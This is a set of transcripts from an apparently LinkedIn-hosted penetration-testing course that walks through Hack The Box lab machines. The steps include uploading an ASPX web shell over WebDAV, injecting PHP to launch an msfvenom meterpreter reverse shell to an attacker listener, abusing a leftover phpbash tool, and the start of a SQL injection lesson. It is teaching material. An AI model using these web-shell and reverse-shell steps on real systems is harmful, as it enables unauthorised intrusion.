> **[3:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=218)** Who am I?
>
> **[3:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=220)** I'm www data and we can list the folder.
>
> **[3:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=226)** Note the kamehameha dot php file.
>
> **[3:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=228)** This is our executable payload that we are working through.
>
> **[3:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=232)** Okay.
>
> **[3:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-your-way-into-the-gym?u=76281980&t=233)** We've successfully exploited the gym management software using a Python exploit to gain a web shell service.

> [!info]- Semantic Content
>
> **CLI Commands:** php (6), python (4), find (2), make (2)
> **Code Keywords:** let (5), function (2), require (1), this. (1)
> **Speakers:** - let (1), - or (1), - one (1), - hash (1), - and (1)
> **Env Vars:** php (2), sql (2), png (2)
> **Definitions:** is a  (2)
> **Prerequisites:** setup (2)
> **Tools:** command prompt (1)
> **Exercise Files:** source code (1)

#### Exploiting through an ASPX shell with Cadaver
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=0)** - Web distributed authoring and versioning, WebDAV, is an extension of HTTP that allows clients to perform remote web content authoring operations.
>
> **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=11)** For WebDAV sites, which also allow HTTP messages, there's a very effective tool we can use to upload a shell.
>
> **[0:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=19)** The tool's called cadaver and it's simple to use.
>
> **[0:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=22)** Cadaver supports file upload, download, on-screen display, move and copy, collection creation and deletion, and locking operations.
>
> **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=31)** As a PEN tester, the main use we have for it is to upload a file, typically a web shell.
>
> **[0:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=38)** Cadaver uses a command line syntax similar to FTP.
>
> **[0:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=42)** Let's look at the manual documentation for it.
>
> **[0:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=46)** - [Male voice on WebDAV Program] Man cadaver.
>
> **[0:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=50)** - It has a number of options but we won't be using any of them.
>
> **[0:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=53)** We will, however, be using its commands.
>
> **[0:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=58)** We can see that it has a lot of useful bash light commands for testing.
>
> **[1:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=62)** And there's also a number of commands relating to collections, which are, to all intents and purposes, folders managed by WebDAV.
>
> **[1:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=71)** Let's take a look at the hack the box granny server on 10.10.10.15.
>
> **[1:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=77)** We can see that the server website is still under construction and there's nothing for us to work with here.
>
> **[1:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=84)** Let's check the basics out with whatweb 10, dot 10, dot 10, dot 15.
>
> **[1:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=93)** And we see this is powered by [ASP.NET](https://ASP.NET), so we know the kind of shell will want loaded.
>
> **[1:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=99)** We can run Nikto to get a bit more information.
>
> **[1:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=104)** Nikto minus H 10, dot 10, dot 10, dot 15.
>
> **[1:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=109)** Nikto reports the OSVDB-397 vulnerability that the server supports the HTTP method "PUT", and this allows clients to save files on the web server.
>
> **[2:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=121)** That's exactly what we wanted to see.
>
> **[2:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=124)** Let's stop this now and we'll use the nmap WebDAV script to see whether WebDAV is supported.
>
> **[2:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=131)** Nmap 10, dot 10, dot 10, dot 15 minus, minus script equals http WebDAV scan.
>
> **[2:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=145)** So the HTTP service has a number of method types including "PUT".
>
> **[2:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=150)** And it supports a number of WebDAV methods.
>
> **[2:33](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=153)** Let's see what we can find using cadaver.
>
> **[2:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=157)** Cadaver 10, dot 10, dot 10, dot 15.
>
> **[2:42](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=162)** Okay, we get the DAV prompt, so we're in business.
>
> **[2:45](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=165)** Let's run the LS command to see what's in the folder.
>
> **[2:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=169)** We have a number of folders and the IIS start HTM file.
>
> **[2:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=174)** This is the web route.
>
> **[2:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=175)** We have ASP and ASPX command web shells.
>
> **[2:59](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=179)** so I can upload one of them.
>
> **[3:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=181)** I'll upload the ASPX command ASP shell and I'll save it as awen dot text.
>
> **[3:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=187)** This is a technique we can use to avoid the shell being executed as we're uploading it, as all we'll get in that case is the execution output.
>
> **[3:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=196)** Put, slash, user, slash, share, slash, web shells, slash, ASPX, slash, cmbASP, dot ASPX.
>
> **[3:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=211)** And we'll call that awen dot text.
>
> **[3:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=216)** Okay, we've uploaded our ASP shell, so now let's rename it using the move command.
>
> **[3:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=223)** Note that cadaver also supports the copy command.
>
> **[3:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=227)** Move awen dot text to awen dot ASPX.
>
> **[3:56](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=236)** Okay.
>
> **[4:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=240)** Now we can navigate to our awen shell 10, dot 10, dot 10, dot 15, slash awen, dot ASPX.
>
> **[4:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=251)** Now we get a command prompt box.
>
> **[4:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=253)** Let's enter the "whoami" command.
>
> **[4:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=257)** Who am I?
>
> **[4:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=259)** Nt authority.
>
> **[4:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=261)** This isn't a privileged account but we do have command execution access.
>
> **[4:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=266)** Let's run the dir command and we'll use the eight character DOS file names.
>
> **[4:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=270)** Dir, slash, docume-one and we can see the list of user folders.
>
> **[4:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=284)** Cadaver is an extremely useful tool for WebDAV sites and makes gaining shell access fairly simple.
>
> **[4:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=290)** It doesn't provide privileged access so there's more work to do.
>
> **[4:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-through-an-aspx-shell-with-cadaver?u=76281980&t=294)** But having a shell or a command execution is a great start.

> [!info]- Semantic Content
>
> **Env Vars:** aspx (6), http (4), asp (4), put (2), pen (1)
> **Code Keywords:** let (9)
> **Definitions:** is an  (2), is a  (2)
> **Tools:** command line (1), bash (1), command prompt (1)
> **Speakers:** - web (1), - [male (1), - it (1)
> **CLI Commands:** find (1), ls (1)
> **Code Identifiers:** cmbasp (1)
> **URLs:** [asp.net](https://asp.net) (1)

#### Checking web page source
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=0)** - [Instructor] Sometimes a challenging problem can be solved with some basic checks.
>
> **[0:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=5)** And for the web pen tester, one of the simplest is to check the page source to see whether there are any clues.
>
> **[0:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=11)** Let's take a look at the Hack the Box Calamity server, its IP address: 10.10.10.27.
>
> **[0:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=18)** This is a Brotherhood Software site, which is under development.
>
> **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=23)** If we check the page source, it doesn't reveal a great deal other than some strange comments in the code.
>
> **[0:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=28)** We'll not get any further here.
>
> **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=31)** Let's use DIRB to do a quick check for hidden pages, dirb [http://10.10.10.27](http://10.10.10.27).
>
> **[0:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=37)** dirb [http://10.10.10.27](http://10.10.10.27).
>
> **[0:43](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=43)** We found an admin.php file as well as the standard index and service-status files.
>
> **[0:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=50)** Let's go take a look at it.
>
> **[0:52](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=52)** Okay, this invites us to log in to the administrator page.
>
> **[0:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=57)** If we check the source, we find that it seems to have the user and password swapped.
>
> **[1:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=62)** So if we have credentials, we need to use them in the opposite way.
>
> **[1:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=66)** It's also interesting to see that the page has a scroll bar, yet there's no long lines of text.
>
> **[1:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=72)** Let's scroll.
>
> **[1:18](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=78)** Here, we see a comment that provides us with the password.
>
> **[1:21](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=81)** Let's close this and try to log in with the username "admin" and this password, remembering the fields are labeled incorrectly, and we'll enter "admin" and "skoupidotenekes", and "skoupidotenekes", and we're in.
>
> **[1:44](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/checking-web-page-source?u=76281980&t=104)** We've been able to check the source of the webpage and find the credentials we need and how to use them.

> [!info]- Semantic Content
>
> **Code Keywords:** let (5)
> **CLI Commands:** find (2), php (1)
> **Versions:** 10.10.10 (3)
> **URLs:** [http://10.10.10.27](http://10.10.10.27) (2)
> **File Paths:** admin.php (1)
> **Env Vars:** dirb (1)
> **Definitions:** is a  (1)
> **Speakers:** - [instructor] (1)

#### Injecting HTML into a web page
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=0)** - [Presenter] In our previous video, we found the credentials to access the calamity server.
>
> **[0:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=4)** Once we logged in, we found what appears to be a webpage, crafted by a somewhat disgruntled employee.
>
> **[0:12](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=12)** On the webpage, we can see an HTML entry box.
>
> **[0:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=15)** Let's enter some HTML <B>Z< /B> appa, and we get Zappa.
>
> **[0:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=28)** Okay, we're running HTML.
>
> **[0:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=31)** It's worth checking now whether that HTML supports, an active scripting language, perhaps PHP.
>
> **[0:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=37)** Let's try a PHP echo command, <?php echo' <p> Lumpy Gravy is good </p> ' ; And show me the page.
>
> **[1:02](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=62)** Lumpy Gravy is good.
>
> **[1:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=65)** Yep. It supports PHP.
>
> **[1:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=68)** So let's create a simple, PHP meterpreter reverse shell using MSFvenom.
>
> **[1:14](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=74)** Our IP address is 10.10.14.11 and we'll use port 2222.
>
> **[1:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=83)** msfvenom -p php /meterpreter /reverse_tcp LHOST= 10.10.14.11 and our LPORT= 2222 Okay, we have the PHP code, so let's copy that.
>
> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=114)** Before we paste and run it, we'll need to set up a meterpreter listener, in Metasploit.
>
> **[2:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=120)** We'll type msfconsole.
>
> **[2:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=126)** use multi/handler.
>
> **[2:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=130)** set payload php /meterpreter/ reverse_tcp.
>
> **[2:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=143)** set lhost 10.10.14.11 set lport 2222 And run.
>
> **[2:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=159)** And now let's paste our PHP code, and show the page.
>
> **[2:49](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=169)** Okay, we've got a meterpreter session running now, so let's activate it.
>
> **[2:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=177)** sessions 1 and we'll check the sysinfo.
>
> **[3:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=183)** It's a calamity server.
>
> **[3:05](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=185)** We can drop into a shell.
>
> **[3:09](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=189)** whoami I'm www.data, so this isn't a privileged shell.
>
> **[3:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=197)** Nevertheless. Let's look at the home folder.
>
> **[3:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=200)** ls /home and we can see salvas.
>
> **[3:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=205)** Let's have a look, ls/home/salvas.
>
> **[3:31](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=211)** And amongst other things, we can see the user.txt file.
>
> **[3:37](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=217)** And if we cat /home/ salvas/user.txt We can see we have the user token.
>
> **[3:50](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=230)** Calamity shows us that checking the simple things, can sometimes save a lot of effort.
>
> **[3:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=235)** Not all penetration testing requires, complex exploit activity.
>
> **[4:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-html-into-a-web-page?u=76281980&t=240)** We've been able to get into a full user shell and retrieve the token with relatively little effort.

> [!info]- Semantic Content
>
> **CLI Commands:** php (9), ls (2), cat (1)
> **Env Vars:** php (6), html (4), lhost (1), lport (1)
> **Code Keywords:** let (8)
> **Versions:** 10.10.14 (3)
> **File Paths:** user.txt (1), salvas/user.txt (1)
> **Code Identifiers:** reverse_tcp (2)
> **Ports:** port 2222 (1)
> **Cross-References:** previous video (1)

#### Exploiting tools left on websites
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=0)** - [Instructor] We'll often see PHP being used on websites, and there are many tools that developers use for doing their development.
>
> **[0:07](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=7)** In some cases, these tools are left active.
>
> **[0:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=10)** Let's take a look at the Hack The Box site Bashed, which is on IP address 10.10.10.68.
>
> **[0:17](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=17)** Okay, we're presented with Arrexel's Development site and it's a phpbash site.
>
> **[0:24](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=24)** This is a website which presents information on a tool called phpbash, which can be used to enable easy remote Bashed scripting on a server.
>
> **[0:34](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=34)** There's nothing specifically for us to use here, however.
>
> **[0:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=38)** Let's run DLRB to do a quick top level brute force attack and find out any additional webpages that might exist on the server.
>
> **[0:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=47)** DLRB HTTP 10.10.10.68.
>
> **[0:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=54)** Okay, DLRB has found a number of folders and pages for us.
>
> **[0:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=58)** We'll leave that going, but let's have a look at the dev page.
>
> **[1:04](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=64)** This has two files, phpbash, min php, and phpbash.php.
>
> **[1:11](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=71)** It looks like this site isn't just providing information on phpbash, but it is actually an operational phpbash site.
>
> **[1:19](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=79)** Let's click on phpbash.php.
>
> **[1:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=82)** Okay, we've now got a command line at the bottom of the screen.
>
> **[1:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=86)** Let's check who we are.
>
> **[1:30](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=90)** We're WW data.
>
> **[1:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=92)** This is an unprivileged command execution.
>
> **[1:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=96)** And let's see what our home user accounts are.
>
> **[1:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=98)** ls /home, and we have scriptmanager and Arrexel.
>
> **[1:47](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=107)** And /home/arrexel, and we can see user.text.
>
> **[1:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=117)** And cat /home/arrexel/user.text,
>
> **[2:08](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=128)** and we can see the contents of the user flag.
>
> **[2:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=133)** Okay, we've not had to upload a shell because we have a command line execution capability using the phpbash tool, which may have been left on for convenience to support web server troubleshooting.
>
> **[2:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/exploiting-tools-left-on-websites?u=76281980&t=145)** Using this, we've gained the user token and we have an excellent foothold on the server.

> [!info]- Semantic Content
>
> **CLI Commands:** php (4), find (1), ls (1), cat (1)
> **Code Keywords:** let (6), this, (1)
> **Env Vars:** dlrb (3), php (1), http (1)
> **File Paths:** phpbash.php (2)
> **Versions:** 10.10.10 (2)
> **Tools:** command line (2)
> **Definitions:** is a  (1), is an  (1)
> **UI Navigation:** click on (1)

#### Injecting SQL using Burp Suite
> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=0)** - [Instructor] Burp Suite is a powerful tool, and we can use it directly to run an SQL injection attack.
>
> **[0:06](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=6)** Let's take a look at the Hack the Box Europa server, which we believe may have an SQL injection vulnerability.
>
> **[0:13](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=13)** Our preliminary enumeration has identified this server has a named admin portal called admin-portal.europacorp.htb.
>
> **[0:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=23)** Let's set that up in our hosts file.
>
> **[0:26](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=26)** sudo nano /etc/hosts.
>
> **[0:32](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/injecting-sql-using-burp-suite?u=76281980&t=32)** And we'll set up 10.10.10.22.
>
